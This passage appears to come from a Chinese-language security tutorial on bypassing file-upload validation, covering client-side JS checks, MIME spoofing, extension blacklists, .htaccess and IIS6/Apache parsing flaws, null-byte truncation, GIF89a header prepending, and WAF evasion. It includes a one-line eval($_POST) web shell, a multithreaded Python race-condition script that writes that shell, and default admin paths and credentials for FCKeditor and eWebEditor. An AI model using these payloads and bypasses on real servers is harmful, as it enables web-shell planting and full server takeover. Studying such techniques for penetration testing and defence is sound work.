string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span>     ext_name<span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">""</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span> name<span class="token operator">=</span><span class="token string">"upload"</span> onsubmit<span class="token operator">=</span><span class="token string">"return     checkFile()"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"MAX_FILE_SIZE"</span> value<span class="token operator">=</span><span class="token string">"204800"</span><span class="token operator">/</span><span class="token operator">></span>    请选择要上传的文件：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"上传"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p><h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p><h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p><p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p><p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p><h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p><h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p><p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p><p>Application：用于传输应用程序数据或者二进制数据；</p><p>Message：用于包装一个E-mail消息；</p><p>Image：用于传输静态图片数据；</p><p>Audio：用于传输音频或者音声数据；</p><p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p><h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p><h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测content-type</span>    <span class="token keyword">echo</span> <span class="token string">"sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload success!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p><h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断上传文件类型</span><span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">fileext</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"upload success!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"sorry"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>默认上传后的文件保存的名字是已获取到的名字</p><h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p></blockquote><p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p><p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p><p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p><h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p><p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p><h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p><p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p><p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p><p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p><p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p><p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p><p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p><h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p><p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p><p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p><p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p><p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p><p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p><p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p><p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p><p>能被解析的文件扩展名列表：</p><pre><code>   jsp jspx jspf   asp asa cer aspx</code></pre><p>3.配合操作系统文件命令规则</p><p>（1）上传不符合windows文件命名规则的文件名</p><pre><code>   　　test.asp.   　　test.asp(空格)   　　test.php:1.jpg   　　test.php:: $DATA</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p><p>（2）linux下后缀名大小写</p><p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p><p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p><p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p><pre><code>   　　test.php(0x00).jpg   　　test.php%00.jpg   　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</code></pre><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p><h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p><p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p><p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#PHP    </span><span class="token delimiter">&lt;?php</span> <span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token string">"上传的txt文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token shell-comment comment">#ASP    </span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#include file="上传的txt文件路径" --></span></span><span class="token shell-comment comment">#JSP    </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>inclde</span> <span class="token attr-name">page</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传的txt文件路径<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token keyword">or</span>  <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">%</span>@<span class="token keyword">include</span> file<span class="token operator">=</span><span class="token string">"上传的txt文件路径"</span><span class="token operator">%</span><span class="token operator">></span></code></pre><p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p><h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p><p>file_put_contents 这个函数的第二个参数 可以是数组</p><p>然后 如果代码里用正则匹配 bad word 的时候</p><p>对一个数组进行正则匹配没用</p><h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p><p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p><p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p><p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p><p>PHP使用getimagesize函数验证图片文件头</p><h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p><p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p><pre class=" language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"file upload success.file path is: "</span><span class="token punctuation">.</span><span class="token variable">$newfile</span><span class="token punctuation">.</span><span class="token string">"\n&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:upload the file type is not allowed，delete the file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./info.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php @eval($_POST["drops"]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/shell0.php"</span>        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/copy.php"</span>    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>        file <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>经过几次尝试后成功成功写入shell</p><p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p><h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p><ul><li>PHPCMSv9.6.0任意文件上传</li></ul><h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p><h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p><h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p><pre><code>1、敏感信息暴漏    * 查看版本信息        /FCKeditor/editor/dialog/fck_about.html    * 默认上传页面        /FCKeditor/editor/filemanager/browser/default/browser.html        /FCKeditor/editor/filemanager/browser/default/connectors/test.html        /FCKeditor/editor/filemanager/upload/test.html        /FCKeditor/editor/filemanager/connectors/test.html        /FCKeditor/editor/filemanager/connectors/uploadtest.html    * 其他敏感文件        /FCKeditor/editor/filemanager/connectors/aspx/connector.html        /FCKeditor/editor/filemanager/connectors/asp/connector.html        /FCKeditor/editor/filemanager/connectors/php/connector.php2、黑名单策略错误    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名3、任意文件上传漏洞    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传</code></pre><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><pre><code>1、默认后台    2.80以前为：ewebeditor/admin_login.asp    2.80以后为：admin/login.asp2、默认账号密码    admin   admin8883、数据库地址    默认数据库地址    ewebeditor/db/ewebeditor.mdb    常用数据库地址    ewebeditor/db/ewebeditor.asa    ewebeditor/db/ewebeditor.asa    ewebeditor/db/#ewebeditor.asa    ewebeditor/db/#ewebeditor.mdb    ewebeditor/db/!@#ewebeditor.asp    ewebeditor/db/ewebeditor1033.mdb    asp asa为后缀的数据库下载下来后改为mdb</code></pre><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p><p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p><img 